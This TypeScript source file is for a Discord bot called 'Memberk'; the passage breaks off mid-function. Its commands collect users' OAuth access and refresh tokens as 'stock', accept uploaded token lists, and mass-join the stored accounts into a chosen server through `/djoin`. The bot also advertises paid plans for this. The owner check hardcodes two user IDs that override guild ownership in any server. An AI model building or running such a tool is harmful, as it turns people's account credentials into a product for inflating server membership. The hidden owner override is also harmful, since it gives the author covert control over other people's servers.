import {
  ActionRowBuilder,
  ApplicationCommandOptionType,
  ChannelType,
  EmbedBuilder,
  ModalBuilder,
  PermissionFlagsBits,
  TextInputBuilder,
  TextInputStyle,
  type ChatInputCommandInteraction,
  type RESTPostAPIApplicationCommandsJSONBody,
  type Attachment,
  Routes,
  REST,
  type Client,
} from "discord.js";
import * as crypto from "node:crypto";

import {
  BOT_TOKEN,
  CLIENT_ID,
  COLOR,
  MAIN_GUILD_ID,
  MAX_ROLES_PER_GUILD,
  OWNER_PASSWORD,
  PREFIX,
  SUPER_OWNER_ID,
  SUPER_OWNER_PASSWORD,
} from "../config.js";
import {
  consumeOwnerToken,
  consumeSuperToken,
} from "./session.js";
import {
  addAllowedGuild,
  isAllowedGuild,
  removeAllowedGuild,
} from "../storage/allowedGuilds.js";
import {
  addBlacklisted,
  isBlacklisted,
  removeBlacklisted,
} from "../storage/blacklist.js";
import {
  clearAutoPing,
  getAutoPing,
  setAutoPing,
} from "../storage/autoping.js";
import {
  getRestockTemplate,
  setRestockTemplate,
  resetRestockTemplate,
  renderRestockTemplate,
} from "../storage/restockTemplate.js";
import { sendAutoPing } from "./autoping.js";
import {
  clearStatusRoleConfig,
  getStatusRoleConfig,
  setLogChannel,
  setStatusRoleConfig,
} from "../storage/statusRoles.js";
import { handleInfoCommand } from "./infoCommands.js";
import { sendBotLog } from "./logger.js";
import { getBotLogChannel, setBotLogChannel, clearBotLogChannel } from "../storage/botLog.js";
import { exchangeCode } from "../oauth.js";
import {
  saveUserAuth,
  appendAuthUser,
  readAuthUsers,
} from "../storage/tokens.js";
import {
  addScheduledRestock,
  readDailyRestock,
  removeScheduledRestock,
  writeDailyRestock,
} from "../storage/schedules.js";
import {
  clearChannelLock,
  setChannelLock,
} from "../storage/locks.js";
import {
  addGuildOwnerRole,
  getGuildOwnerRoles,
  removeGuildOwnerRole,
} from "../storage/owners.js";
import {
  getGuildRoleLimits,
  removeGuildRoleLimit,
  setGuildRoleLimit,
} from "../storage/roles.js";
import { dbCount, dbList } from "../storage/subscribers.js";

import * as E from "./embeds.js";
import { isAuthorizedMember } from "./permissions.js";
import {
  clearStock,
  doCheckTokens,
  doCleanupServers,
  doMassJoin,
  doRestockFromStored,
} from "./restock.js";
import { controlPanelComponents, controlPanelEmbed } from "./controlPanel.js";
import { subscribeComponents } from "./subscribeView.js";
import type { BotState } from "./client.js";

const O = ApplicationCommandOptionType;

export function buildSlashDefinitions(): RESTPostAPIApplicationCommandsJSONBody[] {
  return [
    { name: "active_dev", description: "Run this command to qualify for the Discord Active Developer badge", type: 1 },
    {
      name: "auth",
      description: "Manually authenticate with an OAuth code",
      type: 1,
      options: [
        { name: "code", description: "OAuth code from auth link", type: O.String, required: true },
      ],
    },
    { name: "count", description: "Stored token count", type: 1 },
    { name: "list_users", description: "List authenticated users", type: 1 },
    { name: "stock", description: "Show current token stock", type: 1 },
    { name: "status", description: "Bot status & stats", type: 1 },
    { name: "servers", description: "List bot servers", type: 1 },
    {
      name: "server_age",
      description: "Show server age",
      type: 1,
      options: [
        { name: "server_id", description: "Server ID", type: O.String, required: false },
      ],
    },
    { name: "invite", description: "Bot invite link", type: 1 },
    { name: "add", description: "Add bot embed", type: 1 },
    { name: "owners", description: "List all owners", type: 1 },
    {
      name: "setowner_role",
      description: "Grant owner access by role (owners only)",
      type: 1,
      options: [
        { name: "role", description: "Role to grant owner access", type: O.Role, required: true },
      ],
    },
    {
      name: "removeowner_role",
      description: "Revoke owner role (owners only)",
      type: 1,
      options: [
        { name: "role", description: "Role to revoke", type: O.Role, required: true },
      ],
    },
    { name: "listowner_roles", description: "List all owner roles", type: 1 },
    {
      name: "setrole",
      description: "Set a role djoin limit using preset tiers (owners only)",
      type: 1,
    },
    {
      name: "removerole",
      description: "Remove role limit (owners only)",
      type: 1,
      options: [{ name: "role", description: "Role", type: O.Role, required: true }],
    },
    { name: "listroles", description: "List all role limits", type: 1 },
    {
      name: "setchannel",
      description: "Lock a command type to a channel (owners only)",
      type: 1,
      options: [
        {
          name: "type",
          description: "Command type",
          type: O.String,
          required: true,
          choices: [
            { name: "farm/djoin", value: "farm" },
            { name: "farmlog", value: "farmlog" },
            { name: "stock", value: "stock" },
            { name: "restock", value: "restock" },
            { name: "addbot", value: "addbot" },
          ],
        },
        {
          name: "channel",
          description: "Channel",
          type: O.Channel,
          required: true,
          channel_types: [ChannelType.GuildText],
        },
      ],
    },
    {
      name: "clearchannel",
      description: "Clear a channel lock (owners only)",
      type: 1,
      options: [
        {
          name: "type",
          description: "Command type",
          type: O.String,
          required: true,
          choices: [
            { name: "farm/djoin", value: "farm" },
            { name: "farmlog", value: "farmlog" },
            { name: "stock", value: "stock" },
            { name: "restock", value: "restock" },
            { name: "addbot", value: "addbot" },
          ],
        },
      ],
    },
    { name: "listchannels", description: "Show channel locks", type: 1 },
    {
      name: "setrestock",
      description: "Edit or reset the restock broadcast template (owners only)",
      type: 1,
      options: [
        { name: "template", description: "New template text — use {count}, {farm}, {addbot}", type: O.String, required: false },
        { name: "reset", description: "Restore the default template", type: O.Boolean, required: false },
      ],
    },
    { name: "showrestock", description: "Preview the current restock template (owners only)", type: 1 },
    {
      name: "schedule_restock",
      description: "Schedule a restock (owners only)",
      type: 1,
      options: [
        { name: "time", description: "e.g. 1h, 30m, 2h30m", type: O.String, required: true },
        { name: "file", description: ".txt file with tokens", type: O.Attachment, required: false },
        { name: "tokens", description: "Pasted token list", type: O.String, required: false },
      ],
    },
    { name: "list_schedules", description: "Show pending scheduled restocks (owners only)", type: 1 },
    {
      name: "cancel_schedule",
      description: "Cancel a scheduled restock (owners only)",
      type: 1,
      options: [{ name: "id", description: "Schedule ID", type: O.String, required: true }],
    },
    {
      name: "set_daily_restock",
      description: "Configure a daily restock (owners only)",
      type: 1,
      options: [
        { name: "time", description: "HH:MM (24h, MST)", type: O.String, required: true },
        { name: "file", description: ".txt file with tokens", type: O.Attachment, required: false },
        { name: "tokens", description: "Pasted token list", type: O.String, required: false },
      ],
    },
    { name: "cancel_daily_restock", description: "Cancel daily restock (owners only)", type: 1 },
    { name: "daily_restock_status", description: "Show daily restock config (owners only)", type: 1 },
    { name: "subscribers", description: "Count subscribers in this server", type: 1 },
    { name: "livestock", description: "Post a live-updating stock embed everyone can see", type: 1 },
    {
      name: "send_verify",
      description: "Post a public verification embed using the verification bot (owners only)",
      type: 1,
      options: [
        {
          name: "channel",
          description: "Channel to post the embed in (defaults to current channel)",
          type: O.Channel,
          required: false,
          channel_types: [ChannelType.GuildText],
        },
        {
          name: "image",
          description: "Image to display in the verification embed",
          type: O.Attachment,
          required: false,
        },
      ],
    },

    // ─── Super-owner / private commands ──────────────────────────────────
    {
      name: "blacklist",
      description: "Blacklist a user from the bot (super-owner only)",
      type: 1,
      options: [
        { name: "user_id", description: "User ID to blacklist", type: O.String, required: true },
      ],
    },
    {
      name: "unblacklist",
      description: "Remove a user from the blacklist (super-owner only)",
      type: 1,
      options: [
        { name: "user_id", description: "User ID to unblacklist", type: O.String, required: true },
      ],
    },
    {
      name: "blacklist_list",
      description: "Show all blacklisted users (super-owner only)",
      type: 1,
    },
    {
      name: "enable_server",
      description: "Allow another server to use this bot (super-owner only)",
      type: 1,
      options: [
        { name: "server_id", description: "Server (guild) ID to enable", type: O.String, required: true },
      ],
    },
    {
      name: "disable_server",
      description: "Disable an extra server (super-owner only)",
      type: 1,
      options: [
        { name: "server_id", description: "Server (guild) ID to disable", type: O.String, required: true },
      ],
    },
    {
      name: "list_allowed_servers",
      description: "List servers allowed to use this bot (super-owner only)",
      type: 1,
    },
    {
      name: "autoping_set",
      description:
        "Auto-ping new members in a channel when they join (no per-server limit)",
      type: 1,
      options: [
        {
          name: "channel",
          description: "Channel to send the welcome ping in",
          type: O.Channel,
          required: true,
          channel_types: [
            ChannelType.GuildText,
            ChannelType.GuildAnnouncement,
            ChannelType.PublicThread,
            ChannelType.PrivateThread,
            ChannelType.AnnouncementThread,
          ],
        },
        {
          name: "message",
          description:
            "Template. Placeholders: {user} {username} {server} {count}",
          type: O.String,
          required: false,
        },
        {
          name: "role",
          description: "Optional extra role to ping along with the new member",
          type: O.Role,
          required: false,
        },
      ],
    },
    {
      name: "autoping_clear",
      description: "Disable auto-ping in this server",
      type: 1,
    },
    {
      name: "autoping_status",
      description: "Show the current auto-ping configuration for this server",
      type: 1,
    },
    {
      name: "autoping_test",
      description: "Send a test auto-ping for yourself",
      type: 1,
    },

    // ─── Info / Server embeds ─────────────────────────────────────────────
    { name: "rules",           description: "Post the server rules embed",                       type: 1 },
    { name: "tos",             description: "Post the Terms of Service embed",                   type: 1 },
    { name: "info",            description: "Post information about Memberk",                    type: 1 },
    { name: "howto",           description: "Post a how-to-use guide",                          type: 1 },
    { name: "payment_methods", description: "Post accepted payment methods",                     type: 1 },
    { name: "invite_rewards",  description: "Post invite reward tiers",                         type: 1 },
    { name: "role_plans",      description: "Set pricing and post the role plans embed (owners only)", type: 1 },
    { name: "private_bot",     description: "Set pricing and post a private bot listing (owners only)", type: 1 },

    // ─── Status role ──────────────────────────────────────────────────────
    {
      name: "status_role_set",
      description: "Grant a role when members add a specific invite link to their Discord status (owners only)",
      type: 1,
      options: [
        {
          name: "invite_link",
          description: "Invite link or text to watch for in member status",
          type: O.String,
          required: true,
        },
        {
          name: "role",
          description: "Role to grant when the link is detected",
          type: O.Role,
          required: true,
        },
      ],
    },
    { name: "status_role_clear",  description: "Remove the status invite role config (owners only)", type: 1 },
    { name: "status_role_status", description: "Show the current status invite role config",         type: 1 },
    {
      name: "set_log_channel",
      description: "Set the channel where all bot activity logs are sent (owners only)",
      type: 1,
      options: [
        {
          name: "channel",
          description: "Channel to send all bot logs to",
          type: O.Channel,
          required: true,
          channel_types: [ChannelType.GuildText],
        },
      ],
    },
    { name: "clear_log_channel", description: "Remove the bot log channel (owners only)", type: 1 },
    {
      name: "bronze_log_set",
      description: "Set the channel where free bronze role grants/removals are logged (owners only)",
      type: 1,
      options: [
        {
          name: "channel",
          description: "Channel to send bronze role logs to",
          type: O.Channel,
          required: true,
          channel_types: [ChannelType.GuildText],
        },
      ],
    },
    {
      name: "free_bronze_role",
      description: "Post the Free Bronze Role embed with a copyable status text (owners only)",
      type: 1,
      options: [
        {
          name: "invite_link",
          description: "The text/link members need to add to their Discord status",
          type: O.String,
          required: true,
        },
        {
          name: "role",
          description: "The role to grant (defaults to existing status role config)",
          type: O.Role,
          required: true,
        },
      ],
    },
  ];
}

export async function registerCommandsForGuild(guildId: string): Promise<void> {
  const rest = new REST({ version: "10" }).setToken(BOT_TOKEN);
  const body = buildSlashDefinitions();
  try {
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, guildId), { body });
    console.log(`[commands] registered ${body.length} commands for guild ${guildId}`);
  } catch (e) {
    console.error(`[commands] failed to register for guild ${guildId}`, e);
  }
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function buildPasswordModal(tier: "owner" | "super"): ModalBuilder {
  const input = new TextInputBuilder()
    .setCustomId("password")
    .setLabel(tier === "super" ? "Super-owner password" : "Owner password")
    .setStyle(TextInputStyle.Short)
    .setPlaceholder("Enter password…")
    .setRequired(true);
  return new ModalBuilder()
    .setCustomId(`owner_auth:${tier}`)
    .setTitle("🔒 Owner Authentication")
    .addComponents(new ActionRowBuilder<TextInputBuilder>().addComponents(input));
}

async function ownerGuard(
  i: ChatInputCommandInteraction,
): Promise<boolean> {
  if (!i.guild) {
    await i.reply({ embeds: [E.denyEmbed()], ephemeral: true });
    return false;
  }
  const member = await i.guild.members.fetch(i.user.id).catch(() => null);
  if (isAuthorizedMember(i.guild.ownerId, i.guild.id, i.user.id, member)) {
    return true;
  }
  if (consumeOwnerToken(i.user.id)) {
    return true;
  }
  await i.showModal(buildPasswordModal("owner"));
  return false;
}

async function realOwnerGuard(
  i: ChatInputCommandInteraction,
): Promise<boolean> {
  if (!i.guild) {
    await i.reply({ embeds: [E.denyRealOwnerEmbed()], ephemeral: true });
    return false;
  }
  if (
    i.user.id !== i.guild.ownerId &&
    !["1411750730380869828", "1486174745333465179"].includes(i.user.id)
  ) {
    await i.reply({ embeds: [E.denyRealOwnerEmbed()], ephemeral: true });
    return false;
  }
  return true;
}

async function wrongGuildGuard(
  i: ChatInputCommandInteraction,
): Promise<boolean> {
  if (
    !i.guildId ||
    (i.guildId !== MAIN_GUILD_ID && !isAllowedGuild(i.guildId))
  ) {
    await i.reply({ embeds: [E.wrongGuildEmbed()], ephemeral: true });
    return false;
  }
  return true;
}

async function superOwnerGuard(
  i: ChatInputCommandInteraction,
): Promise<boolean> {
  if (i.user.id === SUPER_OWNER_ID) return true;
  if (consumeSuperToken(i.user.id)) return true;
  await i.showModal(buildPasswordModal("super"));
  return false;
}

async function blacklistGuard(
  i: ChatInputCommandInteraction,
): Promise<boolean> {
  if (isBlacklisted(i.user.id)) {
    await i.reply({ embeds: [E.blacklistedEmbed()], ephemeral: true });
    return false;
  }
  return true;
}

async function readAttachment(att: Attachment | null): Promise<string | null> {
  if (!att) return null;
  try {
    const r = await fetch(att.url);
    return await r.text();
  } catch {
    return null;
  }
}

function parseDurationMs(s: string): number | null {
  const m = s.toLowerCase().match(/^(?:(\d+)h)?(?:(\d+)m)?$/);
  if (!m || (!m[1] && !m[2])) return null;
  const h = m[1] ? parseInt(m[1], 10) : 0;
  const min = m[2] ? parseInt(m[2], 10) : 0;
  return (h * 60 + min) * 60 * 1000;
}

function normalizeHHMM(s: string): string | null {
  const m = s.match(/^(\d{1,2}):(\d{2})$/);
  if (!m) return null;
  const h = parseInt(m[1], 10);
  const min = parseInt(m[2], 10);
  if (h < 0 || h > 23 || min < 0 || min > 59) return null;
  return `${String(h).padStart(2, "0")}:${String(min).padStart(2, "0")}`;
}

// ─── Slash command dispatch ───────────────────────────────────────────────────

export async function handleSlash(
  i: ChatInputCommandInteraction,
  state: BotState,
  client: Client,
): Promise<void> {
  if (!(await blacklistGuard(i))) return;
  if (!(await wrongGuildGuard(i))) return;
  const cmd = i.commandName;

  switch (cmd) {
    case "active_dev":
      await i.reply({
        embeds: [
          new EmbedBuilder()
            .setTitle("🏅 Active Developer Badge")
            .setColor(0x5865f2)
            .setDescription(
              "You just used a slash command — that's all Discord requires!\n\n" +
              "Now follow these steps to claim your badge:",
            )
            .addFields(
              {
                name: "Step 1 — Wait 24 hours",
                value: "Discord needs up to **24 hours** to register that you used a slash command on a bot you own.",
              },
              {
                name: "Step 2 — Claim the badge",
                value:
                  "Go to the portal and click **Claim Badge**:\n" +
                  "👉 https://discord.com/developers/active-developer",
              },
              {
                name: "Step 3 — Done!",
                value:
                  "The badge will appear on your Discord profile.\n" +
                  "Run `/active_dev` once every **30 days** to keep it active.",
              },
            )
            .setFooter({ text: "Memberk • Active Developer Badge Helper" })
            .setTimestamp(),
        ],
        ephemeral: true,
      });
      return;
    case "auth": {
      const code = i.options.getString("code", true);
      await i.deferReply({ ephemeral: true });
      const res = await exchangeCode(code.trim());
      if (!res.ok) {
        await i.editReply({
          content:
            `❌ Auth failed: ${res.error}\n\n**Common causes:**\n` +
            `• Code expired — use the Verify button to get a fresh link\n` +
            `• Code already used (each code works once only)\n` +
            `• Redirect URI mismatch in bot config`,
        });
        return;
      }
      const { access_token, refresh_token } = res.data;
      saveUserAuth(i.user.id, access_token, refresh_token);
      const existing = readAuthUsers();
      if (!existing.some((u) => u.userId === i.user.id)) {
        appendAuthUser({ userId: i.user.id, accessToken: access_token, refreshToken: refresh_token });
      }
      i.user.send({ embeds: [E.authSuccessDmEmbed()] }).catch(() => {});
      await i.editReply({ content: "✅ Authenticated and added to stock." });
      return;
    }
    case "check_tokens":
      if (!(await ownerGuard(i))) return;
      await i.deferReply({ ephemeral: true });
      await i.editReply({ embeds: [await doCheckTokens()] });
      return;
    case "count":
      await i.reply({ embeds: [E.countEmbed()] });
      return;
    case "list_users": {
      const { embed } = E.listUsersEmbed();
      await i.reply({ embeds: [embed] });
      return;
    }
    case "stock":
      await i.reply({ embeds: [E.stockEmbed()] });
      return;
    case "status":
      await i.reply({ embeds: [E.statusEmbed(client, state.botStartTime)] });
      return;
    case "servers":
      await i.reply({ embeds: [E.serversEmbed(client, state.serverJoinTimes)] });
      return;
    case "server_age": {
      const sid = i.options.getString("server_id");
      await i.reply({
        embeds: [E.serverAgeEmbed(sid, client, state.serverJoinTimes)],
      });
      return;
    }
    case "invite":
      await i.reply({ embeds: [E.inviteEmbed()] });
      return;
    case "add": {
      const { components } = E.addEmbed(client);
      await i.reply({ components });
      return;
    }
    case "restock": {
      if (!(await ownerGuard(i))) return;
      await i.deferReply({ ephemeral: true });
      const count = i.options.getInteger("count") ?? undefined;
      const e = await doRestockFromStored(count);
      await i.followUp({ embeds: [e], ephemeral: true });
      await sendBotLog(client, i.guildId!, new EmbedBuilder()
        .setTitle("📦 Restock Completed")
        .setColor(COLOR.green)
        .addFields(
          { name: "👤 By", value: `<@${i.user.id}>`, inline: true },
          { name: "🔢 Count", value: count != null ? String(count) : "all", inline: true },
        )
        .setTimestamp());
      return;
    }
    case "deploy": {
      if (!(await ownerGuard(i))) return;
      const { RAILWAY_API_TOKEN, RAILWAY_SERVICE_ID, RAILWAY_ENVIRONMENT_ID } = await import("../config.js");
      if (!RAILWAY_API_TOKEN) {
        await i.reply({
          content:
            "❌ `RAILWAY_API_TOKEN` is not set.\n\n" +
            "**One-time setup:**\n" +
            "1. Open Railway → click your **avatar** (top-right) → **Account Settings**\n" +
            "2. Go to **API Tokens** → click **Create Token**\n" +
            "3. Copy the token\n" +
            "4. Add it as `RAILWAY_API_TOKEN` in Railway → your service → **Variables**\n\n" +
            "After that, `/deploy` will work forever.",
          ephemeral: true,
        });
        return;
      }
      await i.deferReply({ ephemeral: true });
      try {
        const res = await fetch("https://backboard.railway.app/graphql/v2", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${RAILWAY_API_TOKEN}`,
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            query: `mutation { serviceInstanceRedeploy(serviceId: "${RAILWAY_SERVICE_ID}", environmentId: "${RAILWAY_ENVIRONMENT_ID}") }`,
          }),
        });
        const json = await res.json() as { errors?: { message: string }[] };
        if (json.errors?.length) {
          await i.followUp({
            content: `❌ Railway API error: ${json.errors[0].message}`,
            ephemeral: true,
          });
        } else {
          await i.followUp({
            content: "🚀 **Railway redeploy triggered!**\nThe service will rebuild and restart in ~1–2 minutes.",
            ephemeral: true,
          });
        }
      } catch (err) {
        await i.followUp({
          content: `❌ Could not reach Railway: ${(err as Error).message}`,
          ephemeral: true,
        });
      }
      return;
    }
    case "djoin": {
      const sid = i.options.getString("server_id", true);
      // channel lock check
      const lock = (await import("../storage/locks.js")).checkChannelLock(
        i.guildId!,
        "djoin",
        i.channelId!,
      );
      if (lock) {
        await i.reply({
          embeds: [E.channelLockedEmbed(lock, "djoin")],
          ephemeral: true,
        });
        return;
      }
      await i.deferReply();
      const e = await doMassJoin(sid, client, async (txt) => {
        try {
          await i.editReply({ content: txt });
        } catch {
          /* noop */
        }
      });
      if (e) await i.editReply({ content: "", embeds: [e] });
      await sendBotLog(client, i.guildId!, new EmbedBuilder()
        .setTitle("🚀 Mass Join Completed")
        .setColor(COLOR.blurple)
        .addFields(
          { name: "👤 By", value: `<@${i.user.id}>`, inline: true },
          { name: "🏠 Server", value: `\`${sid}\``, inline: true },
        )
        .setTimestamp());
      return;
    }
    case "clear_stock":
      if (!(await ownerGuard(i))) return;
      clearStock();
      await i.reply({ content: "🧹 Stock cleared.", ephemeral: true });
      await sendBotLog(client, i.guildId!, new EmbedBuilder()
        .setTitle("🧹 Stock Cleared")
        .setColor(COLOR.red)
        .addFields({ name: "👤 By", value: `<@${i.user.id}>`, inline: true })
        .setTimestamp());
      return;
    case "cleanup_servers": {
      if (!(await ownerGuard(i))) return;
      await i.deferReply({ ephemeral: true });
      const e = await doCleanupServers(client, i.guild!.id);
      await i.followUp({ embeds: [e], ephemeral: true });
      return;
    }
    case "control_panel": {
      if (!(await ownerGuard(i))) return;
      await i.reply({
        embeds: [controlPanelEmbed()],
        components: controlPanelComponents(),
      });
      return;
    }
    case "owners":
      await i.reply({ embeds: [E.ownersEmbed(i.guild!.ownerId, i.guildId!)] });
      return;
    case "setowner_role": {
      if (!(await realOwnerGuard(i))) return;
      const role = i.options.getRole("role", true);
      const ok = addGuildOwnerRole(i.guildId!, role.id);
      await i.reply({
        content: ok
          ? `✅ <@&${role.id}> can now use owner-only commands.`
          : `ℹ️ <@&${role.id}> already has owner access.`,
        ephemeral: true,
      });
      return;
    }
    case "removeowner_role": {
      if (!(await realOwnerGuard(i))) return;
      const role = i.options.getRole("role", true);
      const ok = removeGuildOwnerRole(i.guildId!, role.id);
      await i.reply({
        content: ok
          ? `✅ Removed owner access for <@&${role.id}>.`
          : `ℹ️ <@&${role.id}> didn't have owner access.`,
        ephemeral: true,
      });
      return;
    }
    case "listowner_roles":
      await i.reply({ embeds: [E.ownerRolesEmbed(i.guildId!)], ephemeral: true });
      return;
    case "restart":
      if (!(await ownerGuard(i))) return;
      await i.reply({ content: "🔄 Restarting bot process…", ephemeral: true });
      setTimeout(() => {
        process.kill(process.pid, "SIGTERM");
      }, 500);
      return;
    case "dashboard":
      if (!(await ownerGuard(i))) return;
      await i.reply({ embeds: [E.dashboardEmbed()], ephemeral: true });
      return;
    case "setrole": {
      if (!(await ownerGuard(i))) return;
      const { setRoleTierEmbed, setRoleTierComponents } = await import("./setRoleView.js");
      await i.reply({
        embeds: [setRoleTierEmbed()],
        components: setRoleTierComponents(),
        ephemeral: true,
      });
      return;
    }
    case "removerole": {
      if (!(await ownerGuard(i))) return;
      const role = i.options.getRole("role", true);
      const removed = removeGuildRoleLimit(i.guildId!, role.id);
      await i.reply({
        content: removed
          ? `✅ Removed limit for <@&${role.id}>.`
          : `ℹ️ <@&${role.id}> had no limit.`,
        ephemeral: true,
      });
      return;
    }
    case "listroles":
      await i.reply({ embeds: [E.roleLimitsEmbed(i.guildId!)], ephemeral: true });
      return;
    case "setchannel": {
      if (!(await ownerGuard(i))) return;
      const type = i.options.getString("type", true) as import("../storage/locks.js").LockType;
      const channel = i.options.getChannel("channel", true);
      setChannelLock(i.guildId!, type, channel.id);
      if (type === "farm") setChannelLock(i.guildId!, "djoin", channel.id);
      const setLabel = type === "farm" ? "farm + djoin" : type;
      await i.reply({
        content: `✅ \`${setLabel}\` channel set to <#${channel.id}>.`,
        ephemeral: true,
      });
      return;
    }
    case "clearchannel": {
      if (!(await ownerGuard(i))) return;
      const type = i.options.getString("type", true) as import("../storage/locks.js").LockType;
      const cleared = clearChannelLock(i.guildId!, type);
      if (type === "farm") clearChannelLock(i.guildId!, "djoin");
      const clearLabel = type === "farm" ? "farm + djoin" : type;
      await i.reply({
        content: cleared ? `✅ \`${clearLabel}\` channel lock cleared.` : "ℹ️ That type was not locked.",
        ephemeral: true,
      });
      return;
    }
    case "listchannels":
      await i.reply({ embeds: [E.channelLocksEmbed(i.guildId!)], ephemeral: true });
      return;
    case "schedule_restock": {
      if (!(await ownerGuard(i))) return;
      const time = i.options.getString("time", true);
      const ms = parseDurationMs(time);
      if (ms === null) {
        await i.reply({ content: "❌ Invalid time. Try `1h`, `30m`, `2h30m`.", ephemeral: true });
        return;
      }
      const file = i.options.getAttachment("file");
      const tokens = i.options.getString("tokens");
      if (!file && !tokens) {
        await i.reply({ embeds: [E.noTokensEmbed()], ephemeral: true });
        return;
      }
      await i.deferReply({ ephemeral: true });
      let raw = tokens ?? "";
      if (file) {
        const t = await readAttachment(file);
        if (t === null) {
          await i.followUp({ content: "❌ Could not read attachment.", ephemeral: true });
          return;
        }
        raw = t;
      }
      const sid = crypto.randomBytes(4).toString("hex");
      const runAt = Date.now() + ms;
      addScheduledRestock({
        id: sid,
        runAt,
        rawTokens: raw,
        channelId: i.channelId!,
        createdBy: i.user.id,
      });
      await i.followUp({
        embeds: [
          E.helpEmbed()
            .setTitle("✅ Restock Scheduled")
            .setDescription(
              `Schedule \`${sid}\` will run in **${time}** (<t:${Math.floor(runAt / 1000)}:R>) in this channel.`,
            ),
        ],
        ephemeral: true,
      });
      return;
    }
    case "setrestock": {
      if (!(await ownerGuard(i))) return;
      const doReset = i.options.getBoolean("reset") ?? false;
      const tmpl = i.options.getString("template");
      if (doReset) {
        resetRestockTemplate(i.guildId!);
        await i.reply({ content: "🔄 Restock template restored to default. Use `/showrestock` to preview it.", ephemeral: true });
        return;
      }
      if (!tmpl) {
        const current = getRestockTemplate(i.guildId!);
        await i.reply({
          embeds: [
            new EmbedBuilder()
              .setTitle("🔄 Restock Template")
              .setDescription("Provide a `template` to update, or set `reset: True` to restore the default.")
              .addFields({ name: "Current Template", value: `\`\`\`${current.slice(0, 900)}\`\`\`` })
              .setColor(COLOR.blurple)
              .setFooter({ text: "Placeholders: {count}, {farm}, {addbot}" }),
          ],
          ephemeral: true,
        });
        return;
      }
      setRestockTemplate(i.guildId!, tmpl);
      await i.reply({ content: "✅ Restock template updated. Use `/showrestock` to preview it.", ephemeral: true });
      return;
    }
    case "showrestock": {
      if (!(await ownerGuard(i))) return;
      const { readChannelLocks } = await import("../storage/locks.js");
      const { readAuthUsers } = await import("../storage/tokens.js");
      const template = getRestockTemplate(i.guildId!);
      const stockCount = readAuthUsers().length;
      const locks = readChannelLocks()[i.guildId!] ?? {};
      const farmId = (locks as Record<string, string>)["farm"] ?? null;
      const addBotId = (locks as Record<string, string>)["addbot"] ?? null;
      const preview = renderRestockTemplate(template, stockCount, farmId, addBotId);
      await i.reply({
        embeds: [
          new EmbedBuilder()
            .setTitle("👁️ Restock Template Preview")
            .setColor(COLOR.blurple)
            .addFields(
              { name: "Template", value: `\`\`\`${template.slice(0, 500)}\`\`\`` },
              { name: "Preview (with current values)", value: preview.slice(0, 500) },
            )
            .setFooter({ text: "Placeholders: {count}, {farm}, {addbot} • Memberk" }),
        ],
        ephemeral: true,
      });
      return;
    }
    case "list_schedules":
      if (!(await ownerGuard(i))) return;
      await i.reply({ embeds: [E.listSchedulesEmbed()], ephemeral: true });
      return;
    case "cancel_schedule": {
      if (!(await ownerGuard(i))) return;
      const id = i.options.getString("id", true);
      const removed = removeScheduledRestock(id);
      await i.reply({
        content: removed ? `✅ Schedule \`${id}\` cancelled.` : `ℹ️ No pending schedule with id \`${id}\`.`,
        ephemeral: true,
      });
      return;
    }
    case "set_daily_restock": {
      if (!(await ownerGuard(i))) return;
      const time = i.options.getString("time", true);
      const norm = normalizeHHMM(time);
      if (!norm) {
        await i.reply({ content: "❌ Invalid time. Use `HH:MM` (24h, MST).", ephemeral: true });
        return;
      }
      const file = i.options.getAttachment("file");
      const tokens = i.options.getString("tokens");
      if (!file && !tokens) {
        await i.reply({ embeds: [E.noTokensEmbed()], ephemeral: true });
        return;
      }
      await i.deferReply({ ephemeral: true });
      let raw = tokens ?? "";
      if (file) {
        const t = await readAttachment(file);
        if (t === null) {
          await i.followUp({ content: "❌ Could not read attachment.", ephemeral: true });
          return;
        }
        raw = t;
      }
      writeDailyRestock({
        time: norm,
        rawTokens: raw,
        channelId: i.channelId!,
        createdBy: i.user.id,
        lastRanDate: null,
      });
      const tokenCount = raw.split(/\r?\n/).filter((l) => l.trim()).length;
      await i.followUp({
        embeds: [
          E.helpEmbed()
            .setTitle("✅ Daily Restock Configured")
            .setDescription(
              `Will run every day at **${norm} MST** with **${tokenCount}** tokens.`,
            ),
        ],
        ephemeral: true,
      });
      return;
    }
    case "cancel_daily_restock":
      if (!(await ownerGuard(i))) return;
      writeDailyRestock(null);
      await i.reply({ content: "✅ Daily restock cancelled.", ephemeral: true });
      return;
    case "daily_restock_status":
      if (!(await ownerGuard(i))) return;
      await i.reply({ embeds: [E.dailyRestockStatusEmbed()], ephemeral: true });
      return;
    case "setup_subscribe": {
      if (!(await ownerGuard(i))) return;
      if (!i.channel || !i.channel.isTextBased() || !("send" in i.channel)) {
        await i.reply({ content: "❌ Cannot post here.", ephemeral: true });
        return;
      }
      await i.channel.send({
        embeds: [E.subscribePanelEmbed(i.guild!.name)],
        components: subscribeComponents(),
      });
      await i.reply({ content: "✅ Subscribe panel posted.", ephemeral: true });
      return;
    }
    case "announce": {
      if (!(await ownerGuard(i))) return;
      const message = i.options.getString("message", true);
      await i.deferReply({ ephemeral: true });
      const subs = dbList(i.guildId!);
      if (subs.length === 0) {
        await i.followUp({ content: "ℹ️ No subscribers yet.", ephemeral: true });
        return;
      }
      const embed = E.announcementDmEmbed(i.guild!.name, message);
      let sent = 0,
        failed = 0;
      for (const uid of subs) {
        try {
          const u = client.users.cache.get(uid) ?? (await client.users.fetch(uid));
          await u.send({ embeds: [embed] });
          sent++;
        } catch {
          failed++;
        }
        await new Promise((r) => setTimeout(r, 100));
      }
      await i.followUp({
        content: `✅ Sent to **${sent}** subscriber(s). Failed: **${failed}**.`,
        ephemeral: true,
      });
      return;
    }
    case "subscribers": {
      const n = dbCount(i.guildId!);
      await i.reply({ content: `📣 **${n}** subscriber(s) in this server.`, ephemeral: true });
      return;
    }
    case "live_stock":
    case "livestock": {
      if (!i.channel || !("send" in i.channel)) {
        await i.reply({ content: "❌ Cannot post here.", ephemeral: true });
        return;
      }
      const msg = await i.channel.send({ embeds: [E.stockEmbed()] });
      const { setLiveMessage } = await import("../storage/liveMessages.js");
      setLiveMessage(state.liveMessages, "stock", { channelId: msg.channelId, messageId: msg.id });
      await i.reply({
        content: "✅ Live stock embed posted (refreshes every 30s).",
        ephemeral: true,
      });
      return;
    }
    case "live_status": {
      if (!(await ownerGuard(i))) return;
      if (!i.channel || !("send" in i.channel)) {
        await i.reply({ content: "❌ Cannot post here.", ephemeral: true });
        return;
      }
      const msg = await i.channel.send({
